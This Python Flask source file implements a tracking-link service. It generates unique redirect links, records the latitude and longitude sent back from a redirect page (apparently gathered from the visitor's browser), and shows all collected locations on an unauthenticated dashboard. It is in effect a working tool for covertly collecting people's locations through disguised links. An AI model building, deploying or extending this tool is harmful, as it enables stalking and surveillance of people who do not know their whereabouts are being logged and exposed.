from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import uuid

app = Flask(__name__)
DB_NAME = 'database.db'

# Inisialisasi database
def init_db():
    with app.app_context():
        db = sqlite3.connect(DB_NAME)
        db.execute('''
            CREATE TABLE IF NOT EXISTS trackers (
                id TEXT PRIMARY KEY,
                redirect_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tracker_id TEXT,
                latitude REAL,
                longitude REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(tracker_id) REFERENCES trackers(id)
            )
        ''')
        db.commit()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_tracker():
    data = request.get_json()
    redirect_url = data.get('redirect_url', '/')
    tracker_id = str(uuid.uuid4())
    conn = sqlite3.connect(DB_NAME)
    conn.execute("INSERT INTO trackers (id, redirect_url) VALUES (?, ?)", (tracker_id, redirect_url))
    conn.commit()
    conn.close()
    return {"link": f"{request.host_url}r/{tracker_id}"}

@app.route('/r/<tracker_id>')
def redirect_link(tracker_id):
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("SELECT redirect_url FROM trackers WHERE id=?", (tracker_id,))
    result = cur.fetchone()
    conn.close()
    if not result:
        return "Invalid Tracker ID", 404
    redirect_url = result[0]
    return render_template('redirect.html', tracker_id=tracker_id, redirect_url=redirect_url)

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    tracker_id = data['tracker_id']
    lat = data['latitude']
    lon = data['longitude']

    conn = sqlite3.connect(DB_NAME)
    conn.execute("INSERT INTO locations (tracker_id, latitude, longitude) VALUES (?, ?, ?)",
                 (tracker_id, lat, lon))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute('''
        SELECT t.id, l.latitude, l.longitude, l.timestamp 
        FROM trackers t
        LEFT JOIN locations l ON t.id = l.tracker_id
    ''')
    results = cur.fetchall()
    conn.close()

    locations = {}
    for row in results:
        tid, lat, lon, ts = row
        if tid not in locations:
            locations[tid] = []
        if lat and lon:
            locations[tid].append({"lat": lat, "lon": lon, "timestamp": ts})
    return render_template('dashboard.html', locations=locations)